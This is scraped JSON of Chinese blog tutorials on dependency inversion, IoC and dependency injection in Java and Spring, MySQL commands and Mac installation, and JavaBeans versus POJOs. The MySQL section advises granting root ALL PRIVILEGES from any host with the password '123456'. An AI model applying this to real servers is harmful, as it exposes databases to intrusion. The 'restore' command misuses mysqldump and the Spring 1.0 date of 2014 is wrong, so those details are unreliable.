principle，DIP）是指一种特定的解耦形式，使得高层次的模块不依赖于低层次的模块的实现细节，依赖关系被颠倒（反转），从而使得低层次模块依赖于高层次模块的需求抽象。 理解 高层次的模块不应依赖低层次的模块，他们都应该依赖于抽象。 抽象不应依赖于具体实现，具体实现应依赖抽象。 高层次的和低层次的对象都应该依赖于相同的抽象接口，一般来说，高层次实体引用接口，而低层次类实现该接口，而不是高层次类直接引用低层次类，以此实现解耦。 从本质上来说，依赖反转原则是面向接口编程的体现。 例子最初的实现在平常的开发中，我们大概都会这样编码。 123456789101112public class Person &#123; private Bike mBike; public Person() &#123; mBike = new Bike(); &#125; public void goOut() &#123; System.out.println(\"外出ing...\"); mBike.drive(); &#125;&#125; 我们创建了一个 Person 类，它拥有一台自行车，而且他出门的时候就骑自行车。 123456public class Test &#123; public static void main(String[] args) &#123; Person person = new Person(); person.goOut(); &#125;&#125; 不过，骑自行车只适合很短的出行。如果，要去郊区游玩呢？自行车可能就不大合适了。于是就要改成汽车。 因此，我们就有了下面的代码。 123456789101112131415public class Person &#123; //private Bike mBike; private Car mCar; public Person() &#123; //mBike = new Bike(); mCar = new Car(); &#125; public void goOut() &#123; System.out.println(\"外出ing...\"); //mBike.drive(); mCar.drive(); &#125;&#125; 不过，如果要去北京，那么汽车又不合适了。 123456789101112131415161718public class Person &#123; //private Bike mBike; //private Car mCar; private Train mTrain; public Person() &#123; //mBike = new Bike(); //mCar = new Car(); mTrain = new Train(); &#125; public void goOut() &#123; System.out.println(\"外出ing...\"); //mBike.drive(); //mCar.drive(); mTrain.drive(); &#125;&#125; 不知道你有没有发现，我们这样的实现并不是很优美。本质上，是因为Person类依赖于一个具体的交通工具， 我们再次回顾下依赖反转原则 （The Dependency Inversion Principle）的定义。 上层模块不应该依赖底层模块，它们（上层模块和底层模块）都应该依赖于抽象。 抽象不应该依赖于细节，细节应该依赖于抽象。 优化的实现而基于依赖反转原则，我们可以对上面的实现进行优化。 由于Person 属于高层模块，而Bike、Car 和 Train 属于底层模块。根据”上层模块不应该依赖底层模块，它们都应该依赖于抽象”，我们应该这样修改： 123456789101112131415161718192021public class Person &#123;// private Bike mBike;// private Car mCar;// private Train mTrain; private Vehicle mvehicle; public Person(Vehicle v) &#123; //mBike = new Bike(); //mCar = new Car(); //mTrain = new Train(); mvehicle = v; &#125; public void goOut() &#123; System.out.println(\"外出ing...\"); //mBike.drive(); //mCar.drive(); //mTrain.drive(); mvehicle.drive(); &#125;&#125; 调用123456789public class Test &#123; public static void main(String[] args) &#123; Person p1 = new Person(new Bike()); p1.goOut(); Person p2 = new Person(new Train()); p2.goOut(); &#125;&#125; 分析现在，Person 类中仅仅依赖于 Vehicle 接口（Person 需要的是 Vehicle，即交通工具），它没有限定自己出行的可能性，任何 Car、Bike 或者是 Train 都可以的，哪怕之后要去太空旅游而坐宇宙飞船。 对于Person 类而言，都是没有区别的。因为，每次实例化一个Person 对象时，只需要传入一个对应的实现了Vehicle 接口的交通工具类即可。 到这一步，就符合了”上层模块不依赖底层模块，它们（上层模块和底层模块）都依赖于抽象“的准则了。 那么，”抽象不应该依赖于细节，细节应该依赖于抽象“又怎么理解呢？ Vehicle 是抽象（或者说，Vehicle 是一个接口），而 Bike、Car、Train 等都是这个抽象具体的实现。Vehicle接口不依赖于具体的细节（即各种交通工具，Bike、Car或Train ），而各种交通工具依赖于抽象（即Vehicle接口）。 总结在上面的例子中，Person 属于高层模块，而Bike、Car 和 Train 属于底层模块。因此： 上层模块（Person类）不依赖于底层模块（Bike、Car 和 Train 类）； 上层模块（Person类）依赖于抽象（Vehicle 接口）； 底层模块（Bike、Car 和 Train 类）也依赖于抽象（Vehicle 接口）。 控制反转 （Inversion of Control）控制反转（Inversion oc Control, IoC）是在面向对象编程中的一种思想，用来减少代码之间的耦合度。 按个人目前的理解，控制反转 （Inversion of Control）可以理解为依赖反转原则 （The Dependency Inversion Principle）概念的延伸，或者说在此基础上的进一步讨论。即，在依赖反转原则（”上层模块不应该依赖底层模块，它们都应该依赖于抽象“）的基础之上，控制反转还进一步去讨论了为对象进行实例化的控制问题。 之所以这么说，是因为在依赖反转原则的讨论上下文中，我们只关心类与类之间的耦合问题（或者说模块与模块之间的耦合问题）；而在控制反转的讨论上下文中，我们在关心在类与类耦合问题的同时，还关心被耦合（被依赖）的类对应的对象在哪进行初始化。 更具体的来说，在控制反转思想中，控制指的是对一个具体的对象内部成员变量的实例化，而反转的是对内部成员变量的实例化过程的控制。 合在一起，就是一个具体的对象内部的成员变量的实例化不再由这个对象来负责（如果由这个对象来负责，则是正常的情况，或者称为正转），而是由一个被称为控制反转容器（IoC container）的实体负责。 从进行对象实例化操作的角度而言： 在正常的模式（或者说非控制反转的模式）中，通常由对象自身来完成对其内部成员变量的实例化（控制）； 而在控制反转的场景中，对象内部的成员变量的实例化，由控制反转容器来完成。即开发者只需要将定义好的类（implementation）交给控制反转容器，控制反转容器会通过反射直接完成对象内部成员变量的实例化（当然，在此之前，开发者需要在特定位置（比如配置文件中），指定对象与对象之间的依赖关系）。 对象实例化场所 - 控制反转容器（IoC container）我们注意到，在上面基于依赖反转原则进行讨论的例子中，我们只是简单地在主函数中完成Person类和具体交通工具类的实例化： 123456789public class Test &#123; public static void main(String[] args) &#123; Person p1 = new Person(new Bike()); p1.goOut(); Person p2 = new Person(new Train()); p2.goOut(); &#125;&#125; 而事实上，对象实例化的场所可以不仅限于这种由程序员通过硬编码（hard code）来完成实例化的情况。 在控制反转的上下文中，包含一个控制反转容器（IoC container）的概念。控制反转容器是指在运行时对对象进行实例化的实体。 因此，控制反转容器专门负责对象的实例化工作。更具体地说，开发者只需要将定义好的类（implementation）交给控制反转容器，并且在特定位置（比如配置文件中）指定对象与对象之间的依赖关系。对应在上面的例子中，就是指定一个具体的Person对象具体使用哪种交通工具（比如Bike）。此后，控制反转容器会通过反射完成被依赖对象的对象实例化。 总结总结来说： 控制是指某个对象对其”内部的成员变量的实例化”的控制； 被反转的是对对象实例化的控制； 反转是相对于正转而言的。在正转（正常的情况）时，在传统应用程序中，是由开发者自己在对象中显式地控制其内部对象（依赖对象）的实例化创建。 从控制反转 （Inversion of Control）到依赖注入 （Dependency Injection）控制反转的概念并不是特别好理解，因为从字面上既没有表达出”是对什么的控制”，也没有表达出”相对于什么的反转”（或者说，什么情况是正转）。 Martin Fowler 在一篇经典文章《Inversion of Control Containers and the Dependency Injection pattern》中，为控制反转起了一个更准确表达其含义的名字，叫做依赖注入 （Dependency Injection）。 相对控制反转而言，“依赖注入”的确更加准确地描述了这种古老而又时兴的设计理念。从名字上理解，所谓依赖注入，即对象实例之间的具体依赖关系在特定位置（比如配置文件或以Java注解的形式）被指定，而控制反转容器负责在运行时，对对象进行实例化，并将被依赖的对象实例注入到对应的对象内部。 对应于上面的例子，假设传统的非依赖注入的实现是这样的（即这个Person对象依赖于Bike出现）： 12Person p1 = new Person(new Bike());p1.goOut(); 采用依赖注入后，开发者仅需在特定位置指定这个Person对象需要Bike对象即可（而不需要显式地像上面代码这样对被依赖的具体的Vehicle进行实例化）。 实现方式我们有不同的方法来实现控制反转： 服务定位器（service locator pattern） 依赖注入（dependency injection） 构造器注入（Constructor injection） Setter方法注入（Setter injection） 接口注入（Interface injection） contextualized lookup template method design pattern strategy design pattern 注意，依赖注入（dependency injection）只是实现控制反转思想的其中一种方式。 依赖注入模式 （Dependency Injection Pattern）控制反转不等于依赖注入对于广义上的控制反转而言，依赖注入模式只是实现控制反转思想的其中一种实现方式。因此，这自然也意味着我们还可以采用其他方法来实现控制反转，比如服务定位器模式（service locator pattern）。 然而，对于狭义上的控制反转，即控制反转等同于依赖注入。因为，我们通常都使用依赖注入模式来实现控制反转思想。 依赖注入的解释假设类 A 对象中依赖一个类 B 对象，一般情况下，需要在类A的实现代码中显式的new一个类B的对象。 采用依赖注入技术之后，类A的实现代码只需要定义一个私有的B对象的引用，而不需要直接new来获得这个对象。控制反转容器会将类B对象实例化后，注入到一个类A对象的类B对象引用中。 对于开发者而言，唯一要做的，就是在特定位置（通常在配置文件或者通过注解的形式），指定类A对象依赖一个类 B对象。 Spring中的依赖注入下面我们结合Spring的控制反转容器，简单描述一下这个过程。 1234567891011class MovieLister&#123; private MovieFinder finder; public void setFinder(MovieFinder finder) &#123; this.finder = finder; &#125;&#125;class ColonMovieFinder extends MovieFinder&#123; public void setFilename(String filename) &#123; this.filename = filename; &#125;&#125; 我们先定义两个类，可以看到都使用了依赖注入的方式，通过外部传入依赖，而不是自己创建依赖。那么问题来了，谁把依赖传给他们，也就是说谁负责创建finder引用指向的对象，并且把这个具体的MovieFinder对象传给MovieLister对象。 答案是Spring的控制反转容器。 要使用控制反转容器，首先要进行配置。这里我们使用XML的配置，也可以通过代码注解（Anotation）方式配置。 下面是spring.xml的内容： 123456789101112&lt;beans&gt; &lt;bean id=\"MovieLister\" class=\"spring.MovieLister\"&gt; &lt;property name=\"finder\"&gt; &lt;ref local=\"MovieFinder\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"MovieFinder\" class=\"spring.ColonMovieFinder\"&gt; &lt;property name=\"filename\"&gt; &lt;value&gt;movies1.txt&lt;/value&gt; &lt;/property&gt; &lt;/bean&gt;&lt;/beans&gt; 在Spring中，每个bean代表一个对象的实例，默认是单例模式，即在程序的生命周期内，所有的对象都只有一个实例，进行重复使用。通过配置bean，控制反转容器在启动的时候会根据配置生成bean实例。 这里，我们只需要知道，控制反转容器会根据XML中的配置，在运行时（runtime）创建一个特定的MovieFinder对象，并把这个特定的MovieFinder对象赋值给一个MovieLister对象的finder字段，最终完成依赖注入的过程。 测试代码下面给出测试代码： 123456public void testWithSpring() throws Exception &#123; ApplicationContext ctx = new FileSystemXmlApplicationContext(\"spring.xml\");//1 MovieLister lister = (MovieLister) ctx.getBean(\"MovieLister\");//2 Movie[] movies = lister.moviesDirectedBy(\"Sergio Leone\"); assertEquals(\"Once Upon a Time in the West\", movies[0].getTitle());&#125; 分析 根据配置生成ApplicationContext，即IoC容器； 从容器中获取MovieLister的实例。 实现依赖注入的方式实现依赖注入有 4 种方式： 构造器中注入（Constructor injection） setter 方式注入（Setter injection） 接口注入（Interface injection） 注解注入 构造器注入（Constructor injection）构造器注入（Constructor injection）是将需要的依赖作为构造函数的参数传递，已完成依赖注入。 方案112345678910111213interface Energy &#123;&#125; class GasEnergy implements Energy &#123;&#125;public class Car &#123; private Energy energy; public Car(Energy energy) &#123; this.energy = energy; &#125;&#125; 在上面的代码中，Car不承担将Energy对象实例化的职能，而是将 energy 对象作为构造函数的一个参数传入。在调用Car的构造函数前就已经初始化好了一个Energy 对象。 方案2除此之外，还可以通过Java中注解的方式（且依赖一个依赖注入框架，如 Spring）以实现基于构造器的依赖注入。即，通过在字段声明前添加@Inject以实现依赖对象的自动注入。 123456789101112interface Energy &#123;&#125; class GasEnergy implements Energy &#123;&#125;public class Car &#123; @Inject Energy energy; public Car() &#123; &#125;&#125; 好处 强依赖解耦：将强依赖之间解耦； 可移植性：在减轻了组件之间依赖关系的同时，也大大提高了组件的可移植性（同时，组件得到重用的机会更多）； 便于测试：便于做Mock测试； 在一个 Person 对象实例化时的一开始，就创建好了依赖。 缺点 后期无法更改依赖。 setter方法注入（setter injection）setter方法注入（setter injection）是指增加setter方法，其参数为需要被注入的依赖对象。 12345678910111213interface Energy &#123;&#125; class GasEnergy implements Energy &#123;&#125;public class Car &#123; Energy energy; public void setEnergy(Energy energy) &#123; this.Energy = energy; &#125;&#125; 优点Person 对象在运行过程中可以灵活地更改依赖。 缺点Person 对象运行时，可能会存在依赖项为 null 的情况，所以需要检测依赖项的状态。 接口注入（Interface injection）接口注入（Interface injection）是指为完成依赖注入创建一个接口，且接口中包含实现依赖注入的方法声明，依赖作为该方法的参数传入。 1234567891011interface EnergyConsumerInterface &#123; public void setEnergy(Energy energy);&#125; class Car implements EnergyConsumerInterface &#123; Energy Energy; public void setEnergy(Energy energy) &#123; Energy = energy; &#125;&#125; 总结控制反转（IoC）是一种在软件工程中实现解耦合的思想，而依赖注入（DI）是一种具体的设计模式。 依赖注入是一种实现控制反转的具体方法，但除此之外还有其他方法可实现控制反转，。 服务定位器模式（Service Locator Pattern）前面，我们曾经提到过，依赖注入模式只是实现控制反转思想的其中一种实现方式。因此，这自然也意味着我们还可以采用其他方法来实现控制反转，比如服务定位器模式（service locator pattern）。 Service Locator模式背后的基本思想是：有一个对象（即服务定位器）知道如何获得一个应用程序所需的所有服务。 也就是说，在我们的例子中，服务定位器应该有一个方法，用于获得一个MovieFinder实例。当然，这不过是把麻烦换了一个样子，我们仍然必须在MovieLister中获得服务定位器，最终得到的依赖关系如下图所示： 在这里，我把ServiceLocator类实现为一个Singleton的注册表，于是MovieLister就可以在实例化时通过ServiceLocator获得一个MovieFinder实例。 12345678910class MovieLister... MovieFinder finder = ServiceLocator.movieFinder();class ServiceLocator... public static MovieFinder movieFinder() &#123; return soleInstance.movieFinder; &#125; private static ServiceLocator soleInstance; private MovieFinder movieFinder; 和注入的方式一样，我们也必须对服务定位器加以配置。在这里，我直接在代码中进行配置，但设计一种通过配置文件获得数据的机制也并非难事。 12345678910111213141516class Tester... private void configure() &#123; ServiceLocator.load(new ServiceLocator( newColonMovieFinder(\"movies1.txt\"))); &#125;class ServiceLocator... public static void load(ServiceLocator arg) &#123; soleInstance = arg; &#125; public ServiceLocator(MovieFinder movieFinder) &#123; this.movieFinder = movieFinder; &#125; 下面是测试代码： 123456789class Tester... public void testSimple() &#123; configure(); MovieLister lister = new MovieLister(); Movie[] movies = lister.moviesDirectedBy(\"Sergio Leone\"); assertEquals(\"Once Upon a Time in the West\",movies[0].getTitle()); &#125; 依赖查找（Dependency Lookup）依赖查找和依赖注入一样属于控制反转原则的具体实现，不同于依赖注入的被动接受，依赖查找这是主动请求，在需要的时候通过调用框架提供的方法来获取对象，获取时需要提供相关的配置文件路径、key等信息来确定获取对象的状态。 Reference Inversion of Control Containers and the Dependency Injection pattern - https://www.martinfowler.com/articles/injection.html IoC容器和Dependency Injection模式 - http://insights.thoughtworkers.org/injection/ IoC Types - https://web.archive.org/web/20090615045650/http://docs.codehaus.org/display/PICO/IoC+Types 深度理解依赖注入（Dependence Injection）- http://www.cnblogs.com/xingyukun/archive/2007/10/20/931331.html 控制反转（IoC）与依赖注入（DI）- http://blog.xiaohansong.com/2015/10/21/IoC-and-DI/ 说说依赖注入 - https://droidyue.com/blog/2015/06/13/talk-show-about-dependency-injection/ IOC/DIP其实是一种管理思想 - https://coolshell.cn/articles/9949.html Dependency Inversion Principle - https://www.oodesign.com/dependency-inversion-principle.html 轻松学，浅析依赖倒置（DIP）、控制反转(IOC)和依赖注入(DI) - https://blog.csdn.net/briblue/article/details/75093382 控制反转（IoC）/依赖注入（DI）- http://wiki.jikexueyuan.com/project/spring-ioc/iocordi.html 控制反转（IoC）与依赖注入（DI） - https://www.jianshu.com/p/07af9dbbbc4b","comments":true,"categories":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/categories/OOP/"}],"tags":[{"name":"OOP","slug":"OOP","permalink":"http://swsmile.info/tags/OOP/"}]},{"title":"【MySQL】MySQL 常用命令","date":"2018-02-23T15:31:56.000Z","path":"2018/02/23/【MySQL】MySQL常用命令/","text":"0 启动 MySQL 服务启动MySQL服务： 1234567$ mysql.server start# Or$ /usr/local/mysql/bin/mysql# Or$ sudo /usr/local/mysql/support-files/mysql.server start 停止与重启 MySQL 服务： 12345# stop$ mysql.server stop# restart$ mysql.server restart 配置文件MySQL配置文件默认路径：/usr/local/mysql/support-files/，也可以通过mysql --verbose --help | grep my.cnf来查找。 1 连接MySQL1$ mysql -h &lt;主机地址&gt; -u &lt;用户名&gt; -p &lt;用户密码&gt; 使用无密码的root账号登录： 1$ mysql -uroot 2 密码管理刚刚安装好的Mysql（默认情况），包含一个密码为空的root账号，和一个匿名账号。 删除匿名账号1delete from mysql.User where User=\"\"; MySql的用户管理是通过 User表来实现的，添加新用户常用的方法有两个： 在User表插入相应的数据行，同时设置相应的权限 通过GRANT命令创建具有某种权限的用户 修改用户密码123456789use mysql;update user set password=PASSWORD(‘123456’) where User='root';flush privileges; # 方法2ALTER USER 'root'@'localhost' IDENTIFIED BY '123456';# 方法3GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION; 2 端口与连接管理端口管理查看MySQL当前端口号 mysql -u root -p登录MySQL show global variables like &#39;port&#39;;查看当前使用端口号 1234567mysql&gt; show global variables like &apos;port&apos;;+---------------+-------+| Variable_name | Value |+---------------+-------+| port | 3306 |+---------------+-------+1 row in set (0.01 sec) 修改MySQL端口号 在Preference中设置MySQL配置文件路径 修改MySQL配置文件my.cnf，用port指定端口 12345# Default Homebrew MySQL server config[mysqld]# Only allow connections from localhostbind-address = 192.168.1.3port=8000 重启MySQLsudo /usr/local/mysql/support-files/mysql.server restart 连接管理允许MySQL被外部连接访问12345678910111213//登录数据库mysql -u root -puse mysql;select user,host from user;update user set host=&apos;%&apos; where user=&apos;root&apos;;flush privileges;// 或者GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; WITH GRANT OPTION;flush privileges;sudo netstat -an | grep 3306 查看当前MySQL连接1$ sudo netstat -an | grep 3307 3 增删查改3.1 修改表结构（schema）创建库1CREATE DATABASE &lt;库名&gt;; 建立表1CREATE TABLE &lt;表名&gt; (字段名 VARCHAR(20), 字段名 CHAR(1)); 修改表名1alter table &lt;原名&gt; rename to &lt;新名&gt;; 添加列1alter table &lt;表名&gt; add column &lt;列名&gt; &lt;类型&gt;; 删除列1alter table &lt;表名&gt; drop column &lt;列名&gt;; 修改列名1alter table &lt;表名&gt; change &lt;原名&gt; &lt;新名&gt; &lt;类型&gt;; 修改列类型1alter table &lt;表名&gt; modify &lt;列名&gt; &lt;类型&gt;; 3.2 修改内容查看所有数据库1show databases; 选中某库1use database; 显示所有表1show tables; 查看某表结构1describe &lt;表名&gt;; 删除数据库1DROP DATABASE &lt;数据库名称&gt;; 删除数据表1DROP TABLE &lt;表名&gt;; 清空表中所有记录1DELETE FROM &lt;表名&gt;; 4 数据导出备份数据库备份数据库结构和数据到一个SQL文件。 1mysqldump -u &lt;用户名&gt; -ps &lt;数据库名&gt; &gt; &lt;导出的.sql&gt; 只导出数据库结构（schema），不导出数据1mysqldump -u &lt;用户名&gt; -p -d &lt;数据库名&gt; &gt; &lt;导出的.sql&gt; 恢复数据库1mysqldump -u &lt;用户名&gt; -p &lt;数据库名&gt; &lt; &lt;导出的.sql&gt;","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【MySQL】Mac 下安装 MySQL","date":"2018-02-23T15:26:55.000Z","path":"2018/02/23/【MySQL】Mac下安装MySQL/","text":"MySQL 安装【方法 1】 通过brew安装MySQL1234567891011121314$ brew install mysql# 指定安装版本$ brew install mysql56# 后台运行$ brew services start mysql@5.6# 前台运行$ /usr/local/opt/mysql@5.5/bin/mysql.server start# 停止$ brew services stop mysql@5.6 $ mysql -u root -p 注意，使用 brew 安装，可能在启动 mysql 时，会出现各种错误。MySQL log 默认位于 /usr/local/var/mysql/{your machine name}.err，查看详细的 log 以排查问题。 【方法 2】通过 MySQL Installer 安装从 https://dev.mysql.com/downloads/ 下载 MySQL Community并安装 进入 Preference，选择 MySQL，并启动 MySQL： 此时我们在命令行输入mysql -uroot -p命令会提示没有commod not found，这是因为我们还需要将mysql加入系统环境变量： 进入/usr/local/mysql/bin，查看此目录下是否有mysql； 执行 vim ~/.bash_profile（或者 vim ~/.zshrc，如果你使用 oh-my-zsh），在该文件中添加： 12345# mysqlexport PATH=$&#123;PATH&#125;:/usr/local/mysql/bin#快速启动、结束MySQL服务, 可以使用alias命令alias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start'alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' 最后，在命令行输入source ~/.bash_profile（或者 source ~/.zshrc）。 查看本机安装后的MySQL信息1$ brew info mysql 注意，默认安装好的MySQL的root是没有密码的，强烈建议设置一个高强度的密码，我们可以通过mysql_secure_installation来完成密码设置。 且默认情况下，MySQL只能被本机连接。 使用MySQL此时如果直接执行mysql以连接本机MySQL数据库，会提示： 原因是因为此时MySQL服务还没有启动。 Note：要修改相关安全性设置，输入mysql_secure_installation以启动配置设置： 启动MySQL服务： 1234567$ mysql.server start# Or$ /usr/local/mysql/bin/mysql# Or$ sudo /usr/local/mysql/support-files/mysql.server start 再次连接数据库： 1$ mysql -uroot 卸载 MySQL12345678910111213141516$ brew remove mysql$ brew cleanup$ sudo rm /usr/local/mysql$ sudo rm -rf /usr/local/var/mysql$ sudo rm -rf /usr/local/mysql*$ sudo rm ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist$ sudo rm -rf /Library/StartupItems/MySQLCOM$ sudo rm -rf /Library/PreferencePanes/MySql*$ launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist$ rm -rf ~/Library/PreferencePanes/My* $ sudo rm -rf /Library/Receipts/mysql*$ sudo rm -rf /Library/Receipts/MySQL*$ sudo rm -rf /private/var/db/receipts/*mysql*","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Java】JavaBean、POJO和EJB","date":"2018-02-23T15:22:40.000Z","path":"2018/02/23/【JAVA】JavaBean、POJO、EJB/","text":"1 JavaBeansJavaBeans在1996年被Sun公司提出，并定义为 A JavaBean is reusable, platform independent component that can be manipulated visually in a builder tool. JavaBeans是一类符合一定编写规范（满足某些约定）的可被作为重用组件的Java类。 JavaBeans 是可重用组件，通过将不同的类（Object）封装到一个类（single Object）中，这个类被称为一个 Bean。 对于一个其方法命名、构造及行为必须符合以下约定的Java类，称为一个bean： 所有属性为private 这个类必须有一个公共的缺省构造函数（即无参数的构造函数） 这个类的属性（property）可能使用 set方法 和 get方法来访问（或is方法，用于访问布尔型属性） 这个类的属性可具有只读、只写或可读可写的状态 这个类是可序列化的（实现了serializable接口） 这个类可以将很多类封装到自己内部 例子GUI 组件（Component） 均是理想的JavaBeans，即所有的Swing和AWT类均是JavaBeans。 在GUI 组件中： 属性（Properties）：JavaBeans的属性是一组被命名的字段，可以包括颜色（color）、标签（label）、字体（font）、字体大小（font size）、显示模式（display size），可用于描述GUI组件的外观、行为和状态 方法（Methods）：JavaBeans的方法与一般Java方法相同。所有的属性都通过方法来读取和修改 事件（Event）：JavaBeans的事件与 SWING/AWT中的事件处理（event handling）相同 持久化（persistence）：实现了Serializable接口使得每个JavaBeans都可以完成持久化存储 当然，我们也可以自己编写JavaBeans。 PersonBean.java1234567891011121314151617181920212223242526272829303132333435363738394041424344public class PersonBean implements java.io.Serializable &#123; /** * name 属性(注意大小写) */ private String name = null; private boolean deceased = false; /** 无参构造器(没有参数) */ public PersonBean() &#123; &#125; /** * name 属性的Getter方法 */ public String getName() &#123; return name; &#125; /** * name 属性的Setter方法 * @param value */ public void setName(final String value) &#123; name = value; &#125; /** * deceased 属性的Getter方法 * 布尔型属性的Getter方法的不同形式(这里使用了is而非get) */ public boolean isDeceased() &#123; return deceased; &#125; /** * deceased 属性的Setter方法 * @param value */ public void setDeceased(final boolean value) &#123; deceased = value; &#125;&#125; TestPersonBean.java123456789101112131415161718192021import player.PersonBean;/** * &lt;code&gt;TestPersonBean&lt;/code&gt;类 */public class TestPersonBean &#123; /** * PersonBean 类测试方法的main函数 * @param ARGS */ public static void main(String[] args) &#123; PersonBean person = new PersonBean(); person.setName(\"张三\"); person.setDeceased(false); // 输出: \"张三[活着]\" System.out.print(person.getName()); System.out.println(person.isDeceased() ? \" [已故]\" : \" [活着]\"); &#125;&#125; JSP中访问JavaBeansJavaBeans可以被使用在JSP中，即在Servlet（相当于Controller）中根据用户通过HTTP请求传递过来的参数构造一个Beans实例（通过调用Beans实例的各种setter方法），并存储到 HttpSession中的。 在JSP页面中，可将这个Beans实例取出（从 HttpSession中），并将其属性显示在HTML页面中。 一个视频例子：Youtube - Java Beans simplified with the dynamic web programming example. using servlets, xml, jsp, html &lt;jsp:useBean&gt; 标签可以在JSP中声明一个Bean。jsp:useBean中的id属性用于指定这个Bean实例的名称（id值可任意设置，只要不和同一JSP文件中其他Bean实例名字相同即可），而class属性指定这个Bean的类类型。 在 jsp:useBean 标签主体中使用 &lt;jsp:getProperty/&gt; 标签来调用 getter 方法，使用 &lt;jsp:setProperty/&gt; 标签来调用 setter 方法： 123456&lt;jsp:useBean id=\"Bean实例的名称\" class=\"Bean的类类型\" scope=\"Bean作用域\"&gt; &lt;jsp:setProperty name=\"Bean实例的名称\" property=\"Bean实例的名称中的某属性名\" value=\"value\"/&gt; &lt;jsp:getProperty name=\"Bean实例的名称\" property=\"Bean实例的名称中的某属性名\"/&gt; ...........&lt;/jsp:useBean&gt; testPersonBean.jsp1234567891011121314151617181920&lt;% // 在JSP中使用PersonBean类 %&gt;&lt;jsp:useBean id=\"person\" class=\"player.PersonBean\" scope=\"page\"/&gt;&lt;jsp:setProperty name=\"person\" property=\"*\"/&gt;&lt;html&gt; &lt;body&gt; 姓名：&lt;jsp:getProperty name=\"person\" property=\"name\"/&gt;&lt;br/&gt; 已故与否？&lt;jsp:getProperty name=\"person\" property=\"deceased\"/&gt;&lt;br/&gt; &lt;br/&gt; &lt;form name=\"beanTest\" method=\"POST\" action=\"testPersonBean.jsp\"&gt; 输入姓名：&lt;input type=\"text\" name=\"name\" size=\"50\"&gt;&lt;br/&gt; 选择选项： &lt;select name=\"deceased\"&gt; &lt;option value=\"false\"&gt;活着&lt;/option&gt; &lt;option value=\"true\"&gt;已故&lt;/option&gt; &lt;/select&gt; &lt;input type=\"submit\" value=\"测试这个JavaBean\"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 2 EJB当初，Java为了响应满足所谓“企业级应用”的开发，具有可伸缩的性能和事务、安全机制，推出了一个叫Java Platform, Enterprise Edition(J2EE) 的框架。 针对该企业级开发对应的JavaBeans，变成了Enterprise Java Bean (EJB)。而且EJB本身比JavaBeans更复杂。 设计EJB的初衷，是希望开发者能够把精力只放在业务上，而事务管理、安全管理和线程管理等统统都交给容器（Web Server）来处理。 使用会话Bean（Session Bean）来专注于处理业务 使用实体Bean（Entity Bean）来和数据库中的元组（tuple）形成映射，使用开发者和数据库打交道，甚至连SQL可能都不需要写 使用消息驱动Bean（Message Driven Bean）来与消息队列进行连接，以处理消息 很快，大家发现EJB极其笨重（在定义一个EJB时，需要增加一大堆与业务逻辑完全没有关系的代码，被迫实现一些与业务逻辑没有任何关系的接口），比如： 123456789101112131415161718192021public class HelloWorldBean implements SessionBean&#123; public void setSessionContext(SessionContext context)&#123; &#125; public void ejbCreate() throws CreateException&#123; &#125; public void ejbActivate() throws CreateException&#123; &#125; public void ejbPassivate() throws CreateException&#123; &#125; public void ejbRemove() throws CreateException&#123; &#125; // 只有这个方法包含业务逻辑，而上面实现的方法都仅仅是为了通过编译 public String hello()&#123; return \"hello world\"; &#125;&#125; 于是，在2000年，程序员们发起了一场叫Plain Old Java Object （POJO）的运动（POJO这个词被Martin Fowler提出），他们希望上面这个类变成这样： 12345public class HelloworldBean&#123; public String hello()&#123; return \"hello world\" &#125;&#125; 因此，提出POJO的初衷，是希望这些描述实体的Java对象能够更简单（区别于复杂的JavaBeans、EJB），即不需要满足任何框架中的约束。 2002年，Rod Johnson写了一本叫《Expert One-on-One J2EE Design and Development》的书，书中分析了Java EE的开发效率和实际性能等方面的问题，从实践和架构的角度探讨了简化开发的原则和方法（初衷是为了替代EJB，并使得Java EE开发更加简单灵活）。并以此作为方法论，实现了一个名为interface21的轻量级开发框架，interface21则为Spring框架的前身。 2014年，Spring发布1.0版本，Rod Jahnson同时推出了另一部影响深远的经典著作《Expert one on one J2EE development withoutEJB》。 Spring顺应了POJO的潮流，提供了一个叫Spring的容器来管理这些POJO。 对于一个JavaBean来说，如果它依赖于其他的Bean，只需要声明即可。Spring容器会负责把依赖的Bean“注入进去”，这就是控制反转（IoC）。 Martin flower 给这种方式起了个更好的名字，叫“依赖注入（Dependency Injections）”。 如果一个Bean 需要一些像事务、日志、安全等这样的通用的服务， 也是只需要声明即可。 Spring 容器在运行时能够动态的“植入”这些服务， 这就是依赖注入。 3 Plain Old Java Object （POJO）Plain Old Java Object （POJO）即简单的Java对象，实际上就是那些没有遵循特定框架约束，不具有任何特殊角色的Java普通对象。以将POJO 和JavaBeans、Enterprise JavaBean （特别是 EBJ3 之前的EJB，因为 EJB3 从代码的表达性层面而言，大大减小了Enterprise JavaBean的使用复杂性）、EntityBean等区别开来。 POJO特点 只有一些private属性（property），且每一个属性都包含其对应的get、set方法用于获取或修改属性值 get、set方法中不包含任何业务逻辑 没有继承任何类，也没有实现任何接口（区别于JavaBeans，即POJO不需要实现serializable接口） 更没有被其他框架侵入（不需要遵循任何框架的约定） POJO对象有时也被称为Data对象，大量应用于表现现实中的对象。如果项目中使用了Hibernate框架，有一个关联的XML文件，使对象与数据库中的表对应，对象的属性与表中的字段相对应（在这个语境中，我们可以将POJO理解为简单的实体类）。 123456789101112131415161718public class Student &#123; private String name; private Integer id; public String getId() &#123; return id; &#125; public void setId(Integer id) &#123; this.id = id; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; JavaBeans 与 POJO 的区别POJO其实是比JavaBeans更纯净的Java简单类，POJO严格遵循简单对象的概念，而JavaBeans中可能会封装一些简单的逻辑。 